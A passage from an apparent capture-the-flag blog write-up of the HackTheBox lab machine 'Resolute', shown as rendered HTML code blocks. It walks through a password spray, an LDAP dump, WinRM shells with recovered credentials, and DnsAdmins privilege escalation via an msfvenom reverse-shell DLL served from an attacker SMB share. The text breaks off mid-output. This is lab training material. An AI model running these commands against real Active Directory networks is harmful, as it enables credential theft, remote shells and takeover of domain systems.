RESOLUTE  [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [+] megabank.local\melanie:Welcome123!</span><br></pre></td></tr></table></figure><p>Bingo! We have <code>Melanie</code> account credentials. What now?</p><h3 id="LDAP-Dump"><a href="#LDAP-Dump" class="headerlink" title="LDAP Dump"></a>LDAP Dump</h3><p>Since <code>ldap</code> port is open let’s dump Active Directory information from it using <code>ldapdomaindump</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ldapdomaindump -u MEGABANK\\melanie 10.10.10.169</span><br><span class="line">Password:</span><br><span class="line">[*] Connecting to host...</span><br><span class="line">[*] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[*] Starting domain dump</span><br><span class="line">[+] Domain dump finished</span><br></pre></td></tr></table></figure><p>We can now open an <code>python</code> http server to take a look at the informations nicely formatted in HTML format:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>Browsing to <code>domain_users_by_group.html</code> we notice that <code>Melanie</code> belongs to “Remote Management Users”:</p><img width="1106" alt="resolute ldapdump" src="https://user-images.githubusercontent.com/9076747/83160734-d9d9e400-a107-11ea-80c2-f8ef730f41f9.png"><h3 id="Shell-as-Melanie"><a href="#Shell-as-Melanie" class="headerlink" title="Shell as Melanie"></a>Shell as Melanie</h3><p>Since <code>melanie</code> is part of Remote Management Users and WinRM port is open we can probably use it to get a shell:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">hg8</span>@<span class="type">archbook</span> ~]<span class="variable">$</span> evil<span class="literal">-winrm</span> <span class="literal">-i</span> <span class="number">10.10</span>.<span class="number">10.169</span> <span class="literal">-u</span> melanie <span class="literal">-p</span> <span class="string">&quot;Welcome123\!&quot;</span></span><br><span class="line"></span><br><span class="line">Evil<span class="literal">-WinRM</span> shell v2.<span class="number">3</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\melanie\Documents&gt; <span class="built_in">type</span> ..\Desktop\user.txt</span><br><span class="line"><span class="number">0</span>xxxxxxxxxxxxxxxxxx0</span><br></pre></td></tr></table></figure><h2 id="Root-FLag"><a href="#Root-FLag" class="headerlink" title="Root FLag"></a>Root FLag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>Looking around we notice another user account named <code>Ryan</code>:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\&gt; <span class="built_in">dir</span> C:\Users</span><br><span class="line"></span><br><span class="line">    Directory: C:\Users</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">43</span> AM                Administrator</span><br><span class="line">d-----        <span class="number">12</span>/<span class="number">4</span>/<span class="number">2019</span>   <span class="number">2</span>:<span class="number">46</span> AM                melanie</span><br><span class="line">d<span class="literal">-r</span>---       <span class="number">11</span>/<span class="number">20</span>/<span class="number">2016</span>   <span class="number">6</span>:<span class="number">39</span> PM                Public</span><br><span class="line">d-----        <span class="number">9</span>/<span class="number">27</span>/<span class="number">2019</span>   <span class="number">7</span>:<span class="number">05</span> AM                ryan</span><br></pre></td></tr></table></figure><p>We are probably going to have to pivot to his account. Let’s keep that in mind and continue our recon process.</p><h3 id="Pivot-melanie-gt-ryan"><a href="#Pivot-melanie-gt-ryan" class="headerlink" title="Pivot melanie -&gt; ryan"></a>Pivot melanie -&gt; ryan</h3><p>Digging in we found an uncommon hidden folder named <code>PSTranscripts</code> at the root of <code>C:\</code>:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\&gt; <span class="built_in">ls</span> <span class="literal">-Hidden</span></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-<span class="literal">-hs</span>-        <span class="number">12</span>/<span class="number">3</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">40</span> AM                <span class="variable">$RECYCLE</span>.BIN</span><br><span class="line">d-<span class="literal">-hsl</span>        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">17</span> AM                Documents and Settings</span><br><span class="line">d-<span class="literal">-h</span>--        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">48</span> AM                ProgramData</span><br><span class="line">d-<span class="literal">-h</span>--        <span class="number">12</span>/<span class="number">3</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">32</span> AM                PSTranscripts</span><br><span class="line">d-<span class="literal">-hs</span>-        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">17</span> AM                Recovery</span><br><span class="line">d-<span class="literal">-hs</span>-        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">25</span> AM                System Volume Information</span><br><span class="line"><span class="literal">-arhs</span>-       <span class="number">11</span>/<span class="number">20</span>/<span class="number">2016</span>   <span class="number">5</span>:<span class="number">59</span> PM         <span class="number">389408</span> bootmgr</span><br><span class="line"><span class="literal">-a</span><span class="literal">-hs</span>-        <span class="number">7</span>/<span class="number">16</span>/<span class="number">2016</span>   <span class="number">6</span>:<span class="number">10</span> AM              <span class="number">1</span> BOOTNXT</span><br><span class="line"><span class="literal">-a</span><span class="literal">-hs</span>-        <span class="number">5</span>/<span class="number">28</span>/<span class="number">2020</span>   <span class="number">4</span>:<span class="number">52</span> AM      <span class="number">402653184</span> pagefile.sys</span><br></pre></td></tr></table></figure><p>Navigating to this folder we stumble upon a Powershell transcript text file:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\PSTranscripts\<span class="number">20191203</span>&gt; <span class="built_in">ls</span> <span class="literal">-Hidden</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\PSTranscripts\<span class="number">20191203</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line"><span class="literal">-arh</span>--        <span class="number">12</span>/<span class="number">3</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">45</span> AM           <span class="number">3732</span> PowerShell_transcript.RESOLUTE.OJuoBGhU.<span class="number">20191203063201</span>.txt</span><br></pre></td></tr></table></figure><p>Let’s read the full transcript:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\PSTranscripts\<span class="number">20191203</span>&gt; <span class="built_in">type</span> PowerShell_transcript.RESOLUTE.OJuoBGhU.<span class="number">20191203063201</span>.txt</span><br><span class="line"></span><br><span class="line">**********************</span><br><span class="line">Windows PowerShell transcript <span class="built_in">start</span></span><br><span class="line"><span class="built_in">Start</span> time: <span class="number">20191203063201</span></span><br><span class="line">Username: MEGABANK\ryan</span><br><span class="line">RunAs User: MEGABANK\ryan</span><br><span class="line">Machine: RESOLUTE (Microsoft Windows NT <span class="number">10.0</span>.<span class="number">14393.0</span>)</span><br><span class="line">Host Application: C:\Windows\system32\wsmprovhost.exe <span class="literal">-Embedding</span></span><br><span class="line"><span class="keyword">Process</span> ID: <span class="number">2800</span></span><br><span class="line">PSVersion: <span class="number">5.1</span>.<span class="number">14393.2273</span></span><br><span class="line">PSEdition: Desktop</span><br><span class="line">PSCompatibleVersions: <span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>, <span class="number">5.0</span>, <span class="number">5.1</span>.<span class="number">14393.2273</span></span><br><span class="line">BuildVersion: <span class="number">10.0</span>.<span class="number">14393.2273</span></span><br><span class="line">CLRVersion: <span class="number">4.0</span>.<span class="number">30319.42000</span></span><br><span class="line">WSManStackVersion: <span class="number">3.0</span></span><br><span class="line">PSRemotingProtocolVersion: <span class="number">2.3</span></span><br><span class="line">SerializationVersion: <span class="number">1.1</span>.<span class="number">0.1</span></span><br><span class="line">**********************</span><br><span class="line">Command <span class="built_in">start</span> time: <span class="number">20191203063455</span></span><br><span class="line">**********************</span><br><span class="line"><span class="built_in">PS</span>&gt;TerminatingError(): <span class="string">&quot;System error.&quot;</span></span><br><span class="line">&gt;&gt; CommandInvocation(<span class="built_in">Invoke-Expression</span>): <span class="string">&quot;Invoke-Expression&quot;</span></span><br><span class="line">&gt;&gt; ParameterBinding(<span class="built_in">Invoke-Expression</span>): name=<span class="string">&quot;Command&quot;</span>; value=<span class="string">&quot;-join(<span class="variable">$id</span>,&#x27;PS &#x27;,<span class="variable">$</span>(whoami),&#x27;@&#x27;,<span class="variable">$env:computername</span>,&#x27; &#x27;,<span class="variable">$</span>((gi <span class="variable">$pwd</span>).Name),&#x27;&gt; &#x27;)</span></span><br><span class="line"><span class="string">if (!<span class="variable">$</span>?) &#123; if(<span class="variable">$LASTEXITCODE</span>) &#123; exit <span class="variable">$LASTEXITCODE</span> &#125; else &#123; exit 1 &#125; &#125;&quot;</span></span><br><span class="line">&gt;&gt; CommandInvocation(<span class="built_in">Out-String</span>): <span class="string">&quot;Out-String&quot;</span></span><br><span class="line">&gt;&gt; ParameterBinding(<span class="built_in">Out-String</span>): name=<span class="string">&quot;Stream&quot;</span>; value=<span class="string">&quot;True&quot;</span></span><br><span class="line">**********************</span><br><span class="line">Command <span class="built_in">start</span> time: <span class="number">20191203063455</span></span><br><span class="line">**********************</span><br><span class="line"><span class="built_in">PS</span>&gt;ParameterBinding(<span class="built_in">Out-String</span>): name=<span class="string">&quot;InputObject&quot;</span>; value=<span class="string">&quot;PS megabank\ryan@RESOLUTE Documents&gt; &quot;</span></span><br><span class="line"><span class="built_in">PS</span> megabank\ryan@RESOLUTE Documents&gt;</span><br><span class="line">**********************</span><br><span class="line">Command <span class="built_in">start</span> time: <span class="number">20191203063515</span></span><br><span class="line">**********************</span><br><span class="line"><span class="built_in">PS</span>&gt;CommandInvocation(<span class="built_in">Invoke-Expression</span>): <span class="string">&quot;Invoke-Expression&quot;</span></span><br><span class="line">&gt;&gt; ParameterBinding(<span class="built_in">Invoke-Expression</span>): name=<span class="string">&quot;Command&quot;</span>; value=<span class="string">&quot;cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (!<span class="variable">$</span>?) &#123; if(<span class="variable">$LASTEXITCODE</span>) &#123; exit <span class="variable">$LASTEXITCODE</span> &#125; else &#123; exit 1 &#125; &#125;&quot;</span></span><br><span class="line">&gt;&gt; CommandInvocation(<span class="built_in">Out-String</span>): <span class="string">&quot;Out-String&quot;</span></span><br><span class="line">&gt;&gt; ParameterBinding(<span class="built_in">Out-String</span>): name=<span class="string">&quot;Stream&quot;</span>; value=<span class="string">&quot;True&quot;</span></span><br><span class="line">**********************</span><br><span class="line">Windows PowerShell transcript <span class="built_in">start</span></span><br><span class="line"><span class="built_in">Start</span> time: <span class="number">20191203063515</span></span><br><span class="line">Username: MEGABANK\ryan</span><br><span class="line">RunAs User: MEGABANK\ryan</span><br><span class="line">Machine: RESOLUTE (Microsoft Windows NT <span class="number">10.0</span>.<span class="number">14393.0</span>)</span><br><span class="line">Host Application: C:\Windows\system32\wsmprovhost.exe <span class="literal">-Embedding</span></span><br><span class="line"><span class="keyword">Process</span> ID: <span class="number">2800</span></span><br><span class="line">PSVersion: <span class="number">5.1</span>.<span class="number">14393.2273</span></span><br><span class="line">PSEdition: Desktop</span><br><span class="line">PSCompatibleVersions: <span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>, <span class="number">5.0</span>, <span class="number">5.1</span>.<span class="number">14393.2273</span></span><br><span class="line">BuildVersion: <span class="number">10.0</span>.<span class="number">14393.2273</span></span><br><span class="line">CLRVersion: <span class="number">4.0</span>.<span class="number">30319.42000</span></span><br><span class="line">WSManStackVersion: <span class="number">3.0</span></span><br><span class="line">PSRemotingProtocolVersion: <span class="number">2.3</span></span><br><span class="line">SerializationVersion: <span class="number">1.1</span>.<span class="number">0.1</span></span><br><span class="line">**********************</span><br><span class="line">**********************</span><br><span class="line">Command <span class="built_in">start</span> time: <span class="number">20191203063515</span></span><br><span class="line">**********************</span><br><span class="line"><span class="built_in">PS</span>&gt;CommandInvocation(<span class="built_in">Out-String</span>): <span class="string">&quot;Out-String&quot;</span></span><br><span class="line">&gt;&gt; ParameterBinding(<span class="built_in">Out-String</span>): name=<span class="string">&quot;InputObject&quot;</span>; value=<span class="string">&quot;The syntax of this command is:&quot;</span></span><br><span class="line">cmd : The syntax of this command is:</span><br><span class="line">At line:<span class="number">1</span> char:<span class="number">1</span></span><br><span class="line">+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">cmd : The syntax of this command is:</span><br><span class="line">At line:<span class="number">1</span> char:<span class="number">1</span></span><br><span class="line">+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">**********************</span><br><span class="line">Windows PowerShell transcript <span class="built_in">start</span></span><br><span class="line"><span class="built_in">Start</span> time: <span class="number">20191203063515</span></span><br><span class="line">Username: MEGABANK\ryan</span><br><span class="line">RunAs User: MEGABANK\ryan</span><br><span class="line">Machine: RESOLUTE (Microsoft Windows NT <span class="number">10.0</span>.<span class="number">14393.0</span>)</span><br><span class="line">Host Application: C:\Windows\system32\wsmprovhost.exe <span class="literal">-Embedding</span></span><br><span class="line"><span class="keyword">Process</span> ID: <span class="number">2800</span></span><br><span class="line">PSVersion: <span class="number">5.1</span>.<span class="number">14393.2273</span></span><br><span class="line">PSEdition: Desktop</span><br><span class="line">PSCompatibleVersions: <span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>, <span class="number">5.0</span>, <span class="number">5.1</span>.<span class="number">14393.2273</span></span><br><span class="line">BuildVersion: <span class="number">10.0</span>.<span class="number">14393.2273</span></span><br><span class="line">CLRVersion: <span class="number">4.0</span>.<span class="number">30319.42000</span></span><br><span class="line">WSManStackVersion: <span class="number">3.0</span></span><br><span class="line">PSRemotingProtocolVersion: <span class="number">2.3</span></span><br><span class="line">SerializationVersion: <span class="number">1.1</span>.<span class="number">0.1</span></span><br><span class="line">**********************</span><br></pre></td></tr></table></figure><p>Looks like we have <code>Ryan</code> clear text password in there:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span><br></pre></td></tr></table></figure><p>Let’s see if the credentials are valid:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">hg8</span>@<span class="type">archbook</span> ~]<span class="variable">$</span> evil<span class="literal">-winrm</span> <span class="literal">-i</span> <span class="number">10.10</span>.<span class="number">10.169</span> <span class="literal">-u</span> ryan <span class="literal">-p</span> <span class="string">&quot;Serv3r4Admin4cc123\!&quot;</span></span><br><span class="line"></span><br><span class="line">Evil<span class="literal">-WinRM</span> shell v2.<span class="number">3</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\ryan\Documents&gt;</span><br></pre></td></tr></table></figure><p>Bingo! </p><h3 id="DNS-Admin-Privilege-escalation"><a href="#DNS-Admin-Privilege-escalation" class="headerlink" title="DNS Admin Privilege escalation"></a>DNS Admin Privilege escalation</h3><p><code>Ryan</code> account password seems to mean he is the server admin (<code>Serv3r4Admin4cc123!</code>). Let’s see if it’s really the case:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\&gt; whoami /groups</span><br><span class="line"></span><br><span class="line"><span class="built_in">GROUP</span> INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line"><span class="built_in">Group</span> Name                                 <span class="built_in">Type</span>             SID                                            Attributes</span><br><span class="line">========================================== ================ ============================================== ===============================================================</span><br><span class="line">Everyone                                   Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1</span><span class="literal">-1</span><span class="literal">-0</span>                                        Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">BUILTIN\Users                              Alias            S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-32</span><span class="literal">-545</span>                                   Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">BUILTIN\Pre<span class="literal">-Windows</span> <span class="number">2000</span> Compatible Access Alias            S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-32</span><span class="literal">-554</span>                                   Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">BUILTIN\Remote Management Users            Alias            S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-32</span><span class="literal">-580</span>                                   Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">NT AUTHORITY\NETWORK                       Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-2</span>                                        Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">NT AUTHORITY\Authenticated Users           Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-11</span>                                       Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">NT AUTHORITY\This Organization             Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-15</span>                                       Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">MEGABANK\Contractors                       <span class="built_in">Group</span>            S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-1392959593</span><span class="literal">-3013219662</span><span class="literal">-3596683436</span><span class="literal">-1103</span> Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">MEGABANK\DnsAdmins                         Alias            S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-1392959593</span><span class="literal">-3013219662</span><span class="literal">-3596683436</span><span class="literal">-1101</span> Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span>, Local <span class="built_in">Group</span></span><br><span class="line">NT AUTHORITY\NTLM Authentication           Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-64</span><span class="literal">-10</span>                                    Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">Mandatory Label\Medium Mandatory Level     Label            S<span class="literal">-1</span><span class="literal">-16</span><span class="literal">-8192</span></span><br></pre></td></tr></table></figure><p><code>Ryan</code> belongs to <code>DnsAdmins</code> group. Since DNS service is known to run as <code>SYSTEM</code> maybe we can abuse our DNS admin rights to escalate our privileges.</p><p>Searching this topic online we found this article:</p><blockquote><p> <strong>Abusing DNSAdmins privilege for escalation in Active Directory</strong> </p><p> This post details a feature abuse in AD where a user who is member of the DNSAdmins group or have write privileges to a DNS server object can load an arbitrary DLL with SYSTEM privileges on the DNS server. </p><p><a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html">http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html</a></p></blockquote><p>The article mention that this attack will corrupts dns.exe service. It shouldn’t be a issue for other people working on the box since we found this note on <code>Ryan</code> desktop:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\ryan\Desktop&gt; <span class="built_in">type</span> note.txt</span><br><span class="line">Email to team:</span><br><span class="line"></span><br><span class="line">- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within <span class="number">1</span> minute</span><br></pre></td></tr></table></figure><p>Alright sounds like what we have all we need. Let’s give it a try.</p><p>First let’s create our malicious DLL, this one will open a reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=8585 -f dll &gt; hg8.dll</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 460 bytes</span><br><span class="line">Final size of dll file: 5120 bytes</span><br></pre></td></tr></table></figure><p>Then we host this DLL on a Samba server we control:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py</span><br><span class="line">[hg8@archbook ~]$ cp hg8.dll ~/share/</span><br><span class="line">[hg8@archbook ~]$ sudo python smbserver.py -smb2support hg8 /home/hg8/share/</span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 4B324FC8-1670-01D3-9999-5A47BF6EE188 V:3.0</span><br><span class="line">[*] 